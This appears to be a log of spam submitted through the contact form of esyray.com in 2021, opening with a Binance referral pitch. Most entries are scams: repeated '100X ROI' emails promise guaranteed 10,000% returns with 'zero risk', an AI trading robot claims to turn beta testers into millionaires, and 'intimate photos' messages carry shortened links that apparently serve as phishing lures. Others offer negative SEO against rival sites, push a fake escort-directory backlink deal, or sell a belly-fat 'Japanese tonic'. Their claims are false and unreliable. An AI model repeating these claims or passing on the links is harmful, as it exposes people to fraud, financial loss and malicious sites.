Like many others, the pandemic has hit me hard and I lost my job. Now I am doing what I can in between jobs and experimenting with different ways to make money from the internet.

I chanced upon Binance.com (https://bit.ly/3jLZLrm) and started promoting my Binance.com affiliate links to my friends and online. When you introduce your friends to Binance, you get a LIFETIME commission everytime they trade in Binance!

You do need a large number of affiliates to make things work. I was lucky to sign up 3  friends who put in USD$10,000 each and depending from their trade volume, I made an extra USD$1000 to $5000 per month PASSIVELY.

As such, you do not need to put any money of your own into Binance, you can also make money by referring Binance to your friends and associates! -&gt; https://bit.ly/3jLZLrm (my Binance affiliate link)


Go to this url and simply sign up with your email and password. This takes only 30 seconds!  -&gt; https://bit.ly/3jLZLrm
+++ 2021-08-26 03:45:32 AM -- Email from: Eric Jones, -- subject: Cool website!, -- email: eric.jones.z.mail@gmail.com, -- Message is: Cool website!

My name’s Eric, and I just found your site - esyray.com - while surfing the net. You showed up at the top of the search results, so I checked you out. Looks like what you’re doing is pretty cool.
 
But if you don’t mind me asking – after someone like me stumbles across esyray.com, what usually happens?

Is your site generating leads for your business? 
 
I’m guessing some, but I also bet you’d like more… studies show that 7 out 10 who land on a site wind up leaving without a trace.

Not good.

Here’s a thought – what if there was an easy way for every visitor to “raise their hand” to get a phone call from you INSTANTLY… the second they hit your site and said, “call me now.”

You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

That’s why we built out our new SMS Text With Lead feature… because once you’ve captured the visitor’s phone number, you can automatically start a text message (SMS) conversation.
  
Think about the possibilities – even if you don’t close a deal then and there, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Wouldn’t that be cool?

CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!
Eric

PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-08-27 10:13:59 AM -- Email from: Roseann Vosquez, -- subject: Alisia Herington, -- email: DeePennigton@gmail.com, -- Message is: 20 Clever Ways To Get Free Advertising On Google &amp; Beyond https://t9y.me/crCX
+++ 2021-08-27 10:26:47 AM -- Email from: Latosha Vieira, -- subject: Negative SEO Services, -- email: juliaholliday7162@gmail.com, -- Message is: Hello

If you ever need Negative SEO to de-rank any site, you can hire us here
https://www.speed-seo.net/product/negative-seo-service/
+++ 2021-08-27 03:19:15 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-08-27 04:39:08 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-08-28 06:52:23 PM -- Email from: Reginald Kibble, -- subject: Is China really a screwed up country?, -- email: reginald.kibble@msn.com, -- Message is: If you consume CNN and BBC's coverage of China, I am sure you are under the impression that China is a really screwed up country.

The West has a very biased view of China. China's rise is bad for us? Is our system superior?

What is good for the West's government is definitely good for Wall Streets and the bankers, but not necessarily good for the people.

China has a lot to offer to the average guy in the West.

Do you have a business? Consider selling to China

Do you want an incredible life experience like no others? Perhaps you can relocate to China!

What is China really like?

We share some you tube videos of Westerners living in China. Check the videos out and perhap it will change your view of China.

Or Perhaps you can visit China and seek out new opportunities there!


The Most SHOCKING Street Reactions of Foreigners living in CHINA!
https://www.youtube.com/watch?v=0jt3M3QNrH4


Jason (from UK) China vs USA - Who Would Win? 2021 Military / Country Comparison
https://www.youtube.com/watch?v=NO5OH7KFEqw


How China Became So Powerful

https://www.youtube.com/watch?v=qw-FLc7Z01Q

Johnny Harris - It's a story of a certain type of capitalism

China Shaolin Martial Arts
https://www.youtube.com/watch?v=FQg5b6bagGs

Check out Philip Hartshorn's experience in Shao Lin learning Kungfu!


Who REALLY Runs The World and How to Protect Yourself - Gerald Celente
https://www.youtube.com/watch?v=hEusdJ7fi4Q

Am I a Commie? - Question for YouTube Content Creators in China
https://www.youtube.com/watch?v=rKx2B0C8n5c
+++ 2021-08-28 07:57:17 PM -- Email from: aspic, -- subject: I promised., -- email: xhndhcxb@icloud.com, -- Message is: Hi, this is Irina. I am sending you my intimate photos as I promised. https://tinyurl.com/yg8mefl2
+++ 2021-08-29 07:51:56 AM -- Email from: 100X INVESTMENT, -- subject: Make a 10,000% return on investment within 90 days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: 
+++ 2021-08-29 08:40:21 AM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-08-29 03:00:15 PM -- Email from: 100X ROI, -- subject: Invest $2M and earn $200M within 180 days, -- email: 100x@wtebank.com, -- Message is: You can turn a $2M investment into $200M in income within 180 days by investing in the 100X investment account. The 100X investment account is the best investment opportunity globally because it offers you a 10,000% return on investment  within 180 days! To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn
+++ 2021-08-29 04:32:51 PM -- Email from: 100X ROI, -- subject: Make a 10,000% return on investment within 90 days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: 
+++ 2021-08-30 04:12:00 AM -- Email from: 100X ROI, -- subject: Make a 10,000% return on investment within 90 days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: 
+++ 2021-08-30 11:17:54 AM -- Email from: 100X ROI, -- subject: Make $28K daily for 360 days, -- email: 100x@wtebank.com, -- Message is: You can make $28K daily for 360 days by investing in the 100X investment account. The 100X investment account is the best investment opportunity globally because it offers you a 10,000% return on investment  within 360 days! To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn
+++ 2021-08-30 03:34:15 PM -- Email from: 100X ROI, -- subject: Turn $5K Into $500K Within 90 Days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: You can turn a $5,000 investment into $500,000 in income within 90 days by investing in the 100X investment account. The 100X investment account is the best investment opportunity globally because it offers you a 10,000% return on investment (100-fold return on investment, 100X or 100 times your money) within 90 days! To learn more about the 100X investment account, go to https://bit.ly/3inYNlt now. To your success, Jason Brian
+++ 2021-08-30 08:22:27 PM -- Email from: DavidJig, -- subject: Need cash? Launch this robot and see what it can., -- email: davidknire342@pacificwest.com, -- Message is: Watch your money grow while you invest with the Robot. 
------&gt; &lt;a href=http://thankfulhannl.herocryptos.cn/&gt;thankfulhannl.geronmonet.cn&lt;/a&gt; 
------&gt;   defeatedeafee.herocryptos.cn
+++ 2021-08-30 09:09:43 PM -- Email from: WTE, -- subject: Make $100K daily. Get paid daily, -- email: 100x@wtebank.com, -- Message is: You can make $100K daily and get paid daily by investing in the 100X investment account. The 100X investment account is the best investment opportunity globally because it offers you a 10,000% return on investment  within 360 days! To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn
+++ 2021-08-30 09:37:22 PM -- Email from: 100X ROI, -- subject: Invest $10M and earn $1B within 360 days, -- email: 100x@wtebank.com, -- Message is: You can turn a $10M investment into $1B in income within 360 days by investing in the 100X investment account. The 100X investment account is the best investment opportunity globally because it offers you a 10,000% return on investment  within 360 days! To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn
+++ 2021-08-30 10:19:44 PM -- Email from: Mike WifKinson, -- subject: Local SEO for more business, -- email: theresaharris7162@gmail.com, -- Message is: Hello 
 
We will increase your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our pricelist here, we offer Local SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
NEW: 
https://www.speed-seo.net/product/zip-codes-gmaps-citations/ 
 
regards 
Mike WifKinson
 
Speed SEO Digital Agency
+++ 2021-08-30 11:37:02 PM -- Email from: Lola Glennie, -- subject: Is China really a screwed up country?, -- email: glennie.lola@gmail.com, -- Message is: If you consume CNN and BBC's coverage of China, I am sure you are under the impression that China is a really screwed up country.

The West has a very biased view of China. China's rise is bad for us? Is our system superior?

What is good for the West's government is definitely good for Wall Streets and the bankers, but not necessarily good for the people.

China has a lot to offer to the average guy in the West.

Do you have a business? Consider selling to China

Do you want an incredible life experience like no others? Perhaps you can relocate to China!

What is China really like?

We share some you tube videos of Westerners living in China. Check the videos out and perhap it will change your view of China.

Or Perhaps you can visit China and seek out new opportunities there!


The Most SHOCKING Street Reactions of Foreigners living in CHINA!
https://www.youtube.com/watch?v=0jt3M3QNrH4


Jason (from UK) China vs USA - Who Would Win? 2021 Military / Country Comparison
https://www.youtube.com/watch?v=NO5OH7KFEqw


How China Became So Powerful

https://www.youtube.com/watch?v=qw-FLc7Z01Q

Johnny Harris - It's a story of a certain type of capitalism

China Shaolin Martial Arts
https://www.youtube.com/watch?v=FQg5b6bagGs

Check out Philip Hartshorn's experience in Shao Lin learning Kungfu!


Who REALLY Runs The World and How to Protect Yourself - Gerald Celente
https://www.youtube.com/watch?v=hEusdJ7fi4Q

Am I a Commie? - Question for YouTube Content Creators in China
https://www.youtube.com/watch?v=rKx2B0C8n5c
+++ 2021-08-31 01:11:34 AM -- Email from: 100X ROI, -- subject: Turn $10K Into $1M Within 90 Days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: You can turn a $10K investment into $1M in income within 90 days by investing in the 100X investment account. The 100X investment account offers you a 10,000% return on investment (100-fold return on investment, 100X or 100 times your money) within 90 days! To learn more about the 100X investment account, go to https://bit.ly/3inYNlt now. To your success, Jason Brian
+++ 2021-08-31 05:30:16 PM -- Email from: 100X ROI, -- subject: Turn $20K Into $2M Within 90 Days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: You can turn a $20K investment into $2M in income within 90 days by investing in the 100X investment account. The 100X investment account offers you a 10,000% return on investment (100-fold return on investment, 100X or 100 times your money) within 90 days! To learn more about the 100X investment account, go to https://bit.ly/3inYNlt now. To your success, Jason Brian
+++ 2021-09-01 04:38:41 AM -- Email from: 100X ROI, -- subject: Turn $30K Into $3M Within 90 Days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: You can turn a $30K investment into $3M in income within 90 days by investing in the 100X investment account. The 100X investment account offers you a 10,000% return on investment (100-fold return on investment, 100X or 100 times your money) within 90 days! To learn more about the 100X investment account, go to https://bit.ly/3inYNlt now. To your success, Jason Brian
+++ 2021-09-01 05:28:06 AM -- Email from: Lacy Sievier, -- subject: Is China really a screwed up country?, -- email: sievier.lacy@msn.com, -- Message is: If you consume CNN and BBC's coverage of China, I am sure you are under the impression that China is a really screwed up country.

The West has a very biased view of China. China's rise is bad for us? Is our system superior?

What is good for the West's government is definitely good for Wall Streets and the bankers, but not necessarily good for the people.

China has a lot to offer to the average guy in the West.

Do you have a business? Consider selling to China

Do you want an incredible life experience like no others? Perhaps you can relocate to China!

What is China really like?

We share some you tube videos of Westerners living in China. Check the videos out and perhap it will change your view of China.

Or Perhaps you can visit China and seek out new opportunities there!


The Most SHOCKING Street Reactions of Foreigners living in CHINA!
https://www.youtube.com/watch?v=0jt3M3QNrH4


Jason (from UK) China vs USA - Who Would Win? 2021 Military / Country Comparison
https://www.youtube.com/watch?v=NO5OH7KFEqw


How China Became So Powerful

https://www.youtube.com/watch?v=qw-FLc7Z01Q

Johnny Harris - It's a story of a certain type of capitalism

China Shaolin Martial Arts
https://www.youtube.com/watch?v=FQg5b6bagGs

Check out Philip Hartshorn's experience in Shao Lin learning Kungfu!


Who REALLY Runs The World and How to Protect Yourself - Gerald Celente
https://www.youtube.com/watch?v=hEusdJ7fi4Q

Am I a Commie? - Question for YouTube Content Creators in China
https://www.youtube.com/watch?v=rKx2B0C8n5c
+++ 2021-09-01 06:10:39 AM -- Email from: Elana Fisken, -- subject: , -- email: fisken.elana@gmail.com, -- Message is: 20 Clever Ways To Get Free Advertising On Google &amp; Beyond :https://shortest.link/Nbj
+++ 2021-09-01 05:10:02 PM -- Email from: 100X ROI, -- subject: Turn $40K Into $4M Within 90 Days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: You can turn a $40K investment into $4M in income within 90 days by investing in the 100X investment account. The 100X investment account offers you a 10,000% return on investment (100-fold return on investment, 100X or 100 times your money) within 90 days! To learn more about the 100X investment account, go to https://bit.ly/3inYNlt now. To your success, Jason Brian
+++ 2021-09-02 12:33:58 PM -- Email from: 100X ROI, -- subject: Make a 10,080% return on investment within 360 days, -- email: 100x@wtebank.com, -- Message is: 
+++ 2021-09-02 06:19:50 PM -- Email from: aspic, -- subject: I promised., -- email: vdcd1c6z@hotmail.com, -- Message is: Hi, this is Irina. I am sending you my intimate photos as I promised. https://tinyurl.com/yj6zavwe
+++ 2021-09-03 07:33:34 PM -- Email from: Natalie Turner, -- subject: Introduction, -- email: natalie@socialgrowthengine.com, -- Message is: Have you felt like there's no way out of the social media marketing rut? We are here to help grow your business with 100% human powered services. Our company specializes in helping photographers who aim for perfection and love being found on Instagram!

You need more followers and engagement? Look no further than the Instagram Growth Engine PRO - https://socialgrowthengine.com/collections/instagram?rfsn=6024360.c037b7a
+++ 2021-09-04 12:12:06 AM -- Email from: aspic, -- subject: I promised., -- email: tp3v85g2@gmail.com, -- Message is: Hi, this is Jeniffer. I am sending you my intimate photos as I promised. https://tinyurl.com/yzmwmzjv
+++ 2021-09-04 06:06:34 PM -- Email from: Eloisa Adair, -- subject: , -- email: weusebio@flaido.com, -- Message is: Since everyone needs traffic to their websites, Google, YouTube, Facebook, and LinkedIn are among the top 20 most visited sites in the world. There are so many other sites that you can get traffic to your site from that most marketers haven’t even considered. Here are 5 examples of high traffic sites that you can take advantage of and drive tons of free traffic back to your site.https://is.gd/cBZZxx
+++ 2021-09-05 12:01:55 AM -- Email from: Louella Coulston, -- subject: You Want to Know How to Get Powerful Backlinks ?, -- email: louella.coulston@gmail.com, -- Message is: You Want to Know What Is Link Building and How Does It Work ?
You Want to Know How to Get Powerful Backlinks ?
Check this out   http://paxtonlrwa85295.bloggerbags.com/7836741/what-is-link-building-and-how-does-it-work
+++ 2021-09-05 11:42:24 AM -- Email from: 100X ROI, -- subject: Guaranteed 100X investment opportunity without risks, -- email: 100x@wtebank.com, -- Message is: You can make a 10,080% return on investment within 360 days by investing in the 100X investment account at https://bit.ly/3m4uJOj . The 100X investment account offers you a guaranteed 10,080% return on investment within 360 days!  Your risk is zero. Your investment is protected through the WTE investment protection program. Your 10,000% return on investment is 100% guaranteed through the Guaranteed ROI program. To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn
+++ 2021-09-05 09:26:02 PM -- Email from: 100X ROI, -- subject: Guaranteed 100X investment opportunity without risks, -- email: 100x@wtebank.com, -- Message is: You can make a 10,080% return on investment within 360 days by investing in the 100X investment account at https://bit.ly/3m4uJOj . The 100X investment account offers you a guaranteed 10,080% return on investment within 360 days!  Your risk is zero. Your investment is protected through the WTE investment protection program. Your 10,000% return on investment is 100% guaranteed through the Guaranteed ROI program. To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn
+++ 2021-09-05 09:32:43 PM -- Email from: 100X ROI, -- subject: Invest $10M and earn $1B within 360 days. Guaranteed 100X ROI. Protected Investment and Zero Risk, -- email: 100x@wtebank.com, -- Message is: You can turn a $10M investment into $1B in income within 360 days by investing in the 100X investment account. The 100X investment account offers you a 10,000% return on investment within 360 days! Your risk is zero. Your investment is protected through the WTE investment protection program. Your 10,000% return on investment is 100% guaranteed through the Guaranteed ROI program. To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn
+++ 2021-09-06 07:06:24 AM -- Email from: Jeanene Leigland, -- subject: Nathanial Mclauglin, -- email: AnnGustavson@hotmail.com, -- Message is: 7 Ways To Promote Your Business Online For Free https://shortest.link/OY0
+++ 2021-09-06 07:20:12 AM -- Email from: Natalie, -- subject: Introduction, -- email: natalie@socialgrowthengine.com, -- Message is: Have you felt like there's no way out of the social media marketing rut? We are here to help grow your business with 100% human powered services. Our company specializes in helping photographers who aim for perfection and love being found on Instagram!

You need more followers and engagement? Look no further than the Instagram Growth Engine PRO - https://socialgrowthengine.com/collections/instagram?rfsn=6024360.c037b7a
+++ 2021-09-07 09:25:51 AM -- Email from: Roxie Gowing, -- subject: , -- email: gowing.roxie@gmail.com, -- Message is: A maverick Japanese doctor recently leaked the secret ingredients of an ancient Japanese Tonic that targets the root cause of deep belly fat and activates a powerful little-known fat-burning hormone inside you…that MELTS away all your stubborn body fat.
 
 =&gt; Discover the “Done for You” Japanese Tonic to Melt 3 Pounds Every 3.5 Days 
==&gt;https://shortest.link/JtV
+++ 2021-09-07 12:06:08 PM -- Email from: Dawn Hazel, -- subject: esyray.com - speedtest results., -- email: dawn.hazel@msn.com, -- Message is: Are you coming?

Make your website run like a cheetah. Stand out from the competition, keep your web page fast and optimized—get more clients. We'll make esyray.com so flying that your visitors will say ”OMG!”


To accelerate your business effortlessly over the internet you need this phenomenal plan:

https://your-marketers.com/speedup


Regards,
We offer amazing Marketing services you may check on our online shop to make big money in a small business, still not thinking about getting new clients? Here is an easy, one-click unsubscribe link: https://your-marketers.com/?unsubscribe=esyray.com
+++ 2021-09-07 02:38:03 PM -- Email from: Mike Quincy, -- subject: quality monthly SEO plans, -- email: no-replydrype@gmail.com, -- Message is: Hello 
 
I have just analyzed  esyray.com for its SEO metrics and saw that your website could use a boost. 
 
We will improve your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our services below, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start enhancing your sales and leads with us, today! 
 
regards 
Mike Quincy
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-09-08 08:31:46 PM -- Email from: , -- subject: , -- email: crampton.meridith@gmail.com, -- Message is: 
+++ 2021-09-09 05:30:52 AM -- Email from: Natalie, -- subject: Introduction, -- email: natalie@socialgrowthengine.com, -- Message is: Have you felt like there's no way out of the social media marketing rut? We are here to help grow your business with 100% human powered services. Our company specializes in helping photographers who aim for perfection and love being found on Instagram!

You need more followers and engagement? Look no further than the Instagram Growth Engine PRO - https://socialgrowthengine.com/collections/instagram?rfsn=6024360.c037b7a
+++ 2021-09-10 01:58:41 PM -- Email from: Shakia Ablao, -- subject: Marlin Bratton, -- email: TyrellFrankiewicz@gmail.com, -- Message is: Effective And Free Ways To Advertise. Here Is A List... https://is.gd/3XvU8E
+++ 2021-09-10 04:39:49 PM -- Email from: Pansy, -- subject: Jim Gray directory listing., -- email: contact@d-directory.co, -- Message is: Jim Gray,


We are DIRECTORIA business directory, currently, we are in the process of including new companies on our website. We have recently listed Jim Gray on our directory (for free).
This is an excerpt of the listing:


&quot;During a BBQ, Jane stumbled and took a little fall — she assured everyone that she was fine (they offered to call paramedics) she said she had just tripped over ...&quot; 

You can take a look at the full listing  here: --  https://d-directory.co/jim-gray

If you want to  remove it  click here:  https://d-directory.co/remove?ppc=WVZFcTMwTmJRU289

If you want to  make any changes, please, &quot;claim your listing&quot;   by clicking on widget on the right sidebar of your listing.
 

Thanks.
Directoria Team.
+++ 2021-09-13 09:16:11 PM -- Email from: Mira Rust, -- subject: , -- email: nhattyp@nufsh.com, -- Message is: How to earn extra cash with your website without doing a thing: http://www.congreso-hidalgo.gob.mx/urls/7A6
+++ 2021-09-14 02:03:28 PM -- Email from: Ronnie Binns, -- subject: Brain Waner, -- email: ChristiDeputy@gmail.com, -- Message is: Best Free Traffic Sources https://is.gd/3XvU8E
+++ 2021-09-15 12:58:37 PM -- Email from: Natalie Turner, -- subject: Introduction, -- email: natalie@socialgrowthengine.com, -- Message is: Have you felt like there's no way out of the social media marketing rut? We are here to help grow your business with 100% human powered services. Our company specializes in helping photographers who aim for perfection and love being found on Instagram!

You need more followers and engagement? Look no further than the Instagram Growth Engine PRO - https://socialgrowthengine.com/collections/instagram?rfsn=6024360.c037b7a
+++ 2021-09-15 05:26:49 PM -- Email from: Maggie Matheson, -- subject: YOU NEED QUALITY VISITORS FOR YOUR: esyray.com ?, -- email: maggie.matheson@gmail.com, -- Message is: Hello
 
YOU NEED QUALITY VISITORS FOR YOUR: esyray.com  ?
 
We Provide Website Traffic 100% safe for your site,  from Search Engines or Social Media Sites from any country you want.
With this traffic, you can boost ranking in SERP, SEO, profit from CPM
 
CLAIM YOUR 24 HOURS FREE TEST HERE=&gt;  http://mariosyei18529.bloggerbags.com/8099370/get-quality-visitors-for-your-site
 
Thanks, Maggie Matheson
+++ 2021-09-16 07:37:11 PM -- Email from: aspic, -- subject: I promised., -- email: zx31m0by@hotmail.com, -- Message is: Hi, this is Jenny. I am sending you my intimate photos as I promised. https://tinyurl.com/yzco9m9k
+++ 2021-09-18 05:33:09 PM -- Email from: Andre Valadez, -- subject: your listing, -- email: valadez.andre@googlemail.com, -- Message is: I am the head of customer services at Glamour Escorts 69 (glamourescorts69.com), the leading escort industry directory based in Florida, USA.

I have received multiple emails (from your workers and customers) asking us to list esyray.com. However, we cannot list your business on our directory as this is something that needs to be done by the business owners with authority to create listings on behalf of esyray.com.

It is absolutely free to list your business on glamourescorts69.com. A listing on our directory will put your business in front of many interested buyers and pass valuable traffic to your site together with a nice backlink.

To help to keep our directory ad free, we would need you to add a reciprocal link on one of your blog posts or pages to one of our sponsored sites:

Link URL: shopgiejo.com
Anchor Text: Giejo

Link URL: itsmeandyou.com
Anchor Text: Its Me &amp; You

It is entirely up to you to which site you link to. When creating your listing, make sure to add a link to the page where we can find the reciprocal backlink to one of our sites. Listings without reciprocal links will be deleted. This link exchange is perfectly fine because there's no direct exchange of links between your site and our directory.

A few tips

- If you do not receive a confirmation email, make sure to check your junk folder and give it at least 10 minutes. Otherwise, simply try registering under a different email.

- Only upload compressed images. Use https://tinypng.com

-Add a logo to your listing

I hope the above helps and we look forward to seeing your site on our directory.

Kind regards

Glamour Escorts 69 Customer Support
glamourescorts69.com
410 Via De Palmas, Boca Raton, FL 33432, United States
+++ 2021-09-20 10:46:12 AM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-09-20 01:06:06 PM -- Email from: RonaldLot, -- subject: Виртуальный хостинг, -- email: support@xserv24.com, -- Message is: &lt;a href=https://well-web.net/&gt;Виртуальный хостинг&lt;/a&gt; 
&lt;a href=&quot;https://well-web.net/&quot;&gt;Виртуальный хостинг&lt;/a&gt;
+++ 2021-09-20 08:30:42 PM -- Email from: Selene Buchanan, -- subject: Your backlinks for esyray.com, are pending!, -- email: selene.buchanan@gmail.com, -- Message is: Can I help you with getting clients?

You can't expect to make a website and have visitors come to you - that's too passive. You'll need to act.

To boost your company effortlessly on the internet you must have this serious service:
	
https://genius-seo.com/backlinks-generator


With warm regards,
We offer the best Marketing services you can order on our shop for making big money in a small business, still not considering getting new business? Here is an easy, 1-click unsubscribe link: https://genius-seo.com/?unsubscribe=esyray.com
+++ 2021-09-21 05:17:10 PM -- Email from: KevinPieno, -- subject: AI-based trading robot or passive income of $ 47,000, -- email: katy.villegenteee@wanadoo.fr, -- Message is: Hi. 
 
It is a smart AI-based trading robot that will make 93% of successful trades. 
 
The set of users is limited, there are 39 places left. 
 
All other users will pay 10% of each transaction for using our AI trading robot. 
 
Register now and use it for free. 
 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc5TErp&amp;sa=D&amp;2b=ze&amp;usg=AFQjCNGER3suzFXrVfFj8alSN_WnyidwBQ 
 
19 out of 75 of our beta testers became dollar millionaires in 2-3 months with an investment of $ 1000, the rest, using our trading robot, receive passive income of $ 47,000 per month. 
 
You don't need to know anything here, work experience is not needed, your personal manager will help you with everything. 
 
Hurry up to register and start earning passive income. 
 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc5TErp&amp;sa=D&amp;c4=1v&amp;usg=AFQjCNGER3suzFXrVfFj8alSN_WnyidwBQ
+++ 2021-09-21 09:24:25 PM -- Email from: 100X ROI, -- subject: Invest $10M and earn $1B within 360 days. Guaranteed 100X ROI. Protected Investment and Zero Risk, -- email: 100x@wtebank.com, -- Message is: You can turn a $10M investment into $1B in income within 360 days by investing in the 100X investment account. The 100X investment account offers you a 10,000% return on investment within 360 days! Your risk is zero. Your investment is protected through the WTE investment protection program. Your 10,000% return on investment is 100% guaranteed through the Guaranteed ROI program. To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn
